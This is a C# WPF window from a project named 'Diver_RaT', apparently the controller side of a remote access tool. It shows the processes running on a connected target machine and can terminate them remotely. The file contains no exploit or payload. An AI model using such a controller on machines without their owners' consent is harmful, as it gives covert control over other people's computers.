using System;
using System.Collections.Generic;
using System.Text.Json;
using System.Windows;
using System.Windows.Threading;

namespace Diver_RaT
{
    public partial class ProcessWindow : Window
    {
        private readonly TcpServer _server;
        private readonly Device _device;
        private readonly DispatcherTimer _timer;
        private bool _fetching;
        private List<ProcItem> _all = new();

        public ProcessWindow(TcpServer server, Device device)
        {
            InitializeComponent();
            _server = server;
            _device = device;
            Title = $"Process Monitor - {device.ComputerName}";
            TargetText.Text = $"{device.ComputerName} ({device.IpAddress})";

            _timer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(2) };
            _timer.Tick += (_, _) => _ = RefreshAsync();

            _ = RefreshAsync();
        }

        private async System.Threading.Tasks.Task RefreshAsync()
        {
            if (_fetching) return;
            _fetching = true;
            try
            {
                var result = await _server.SendCommandAsync(_device.Id, "LIST_PROCESSES", timeoutMs: 15000);
                if (result.Success && !string.IsNullOrEmpty(result.Result))
                {
                    var items = new List<ProcItem>();
                    using var doc = JsonDocument.Parse(result.Result);
                    foreach (var e in doc.RootElement.EnumerateArray())
                    {
                        items.Add(new ProcItem
                        {
                            Pid = e.TryGetProperty("pid", out var p) ? p.GetInt32() : 0,
                            Name = e.TryGetProperty("name", out var n) ? n.GetString() ?? "" : "",
                            Cpu = e.TryGetProperty("cpu", out var c) && c.ValueKind == JsonValueKind.Number ? c.GetDouble() : 0,
                            Mem = e.TryGetProperty("mem", out var m) && m.ValueKind == JsonValueKind.Number ? m.GetDouble() : 0,
                            Title = e.TryGetProperty("title", out var t) ? t.GetString() ?? "" : ""
                        });
                    }
                    _all = items;
                    ApplyFilter();
                    StatusText.Text = $"{_all.Count} processes  |  updated {DateTime.Now:HH:mm:ss}";
                }
                else
                {
                    StatusText.Text = $"Refresh failed: {result.Error}";
                }
            }
            catch (Exception ex)
            {
                StatusText.Text = $"Refresh failed: {ex.Message}";
            }
            finally
            {
                _fetching = false;
            }
        }

        private void ApplyFilter()
        {
            var q = SearchBox.Text.Trim();
            if (q.Length == 0)
            {
                ProcGrid.ItemsSource = _all;
                return;
            }
            ProcGrid.ItemsSource = _all.FindAll(i =>
                i.Name.Contains(q, StringComparison.OrdinalIgnoreCase) ||
                i.Title.Contains(q, StringComparison.OrdinalIgnoreCase) ||
                i.Pid.ToString() == q);
        }

        private void RefreshButton_Click(object sender, RoutedEventArgs e) => _ = RefreshAsync();

        private void AutoRefresh_Changed(object sender, RoutedEventArgs e)
        {
            if (AutoRefreshCheck.IsChecked == true) _timer.Start();
            else _timer.Stop();
        }

        private void SearchBox_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e) => ApplyFilter();

        private async void TerminateButton_Click(object sender, RoutedEventArgs e)
        {
            if (ProcGrid.SelectedItem is not ProcItem item) return;
            var confirm = MessageBox.Show(
                $"Terminate '{item.Name}' (PID {item.Pid}) on {_device.ComputerName}?",
                "Diver RaT - Terminate Process",
                MessageBoxButton.YesNo,
                MessageBoxImage.Warning);
            if (confirm != MessageBoxResult.Yes) return;

            TerminateButton.IsEnabled = false;
            var result = await _server.SendCommandAsync(_device.Id, "TERMINATE_PROCESS",
                new Dictionary<string, string> { ["pid"] = item.Pid.ToString() });
            TerminateButton.IsEnabled = true;
            StatusText.Text = result.Success ? $"{result.Result}" : $"Failed: {result.Error}";
            await RefreshAsync();
        }

        protected override void OnClosed(EventArgs e)
        {
            _timer.Stop();
            base.OnClosed(e);
        }
    }

    public class ProcItem
    {
        public int Pid { get; set; }
        public string Name { get; set; } = "";
        public double Cpu { get; set; }
        public double Mem { get; set; }
        public string Title { get; set; } = "";
    }
}
